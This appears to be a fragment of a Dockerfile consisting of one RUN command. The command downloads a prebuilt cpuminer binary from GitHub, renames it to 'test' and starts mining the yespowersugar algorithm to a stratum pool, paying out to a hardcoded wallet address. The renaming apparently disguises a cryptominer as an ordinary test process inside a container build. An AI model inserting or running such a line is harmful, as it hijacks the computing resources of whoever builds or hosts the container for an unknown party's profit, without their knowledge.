...
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 test && ./test -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q4zq2pe87jean3zsjsn6lgx2j95are2nhs2v0qp.voc
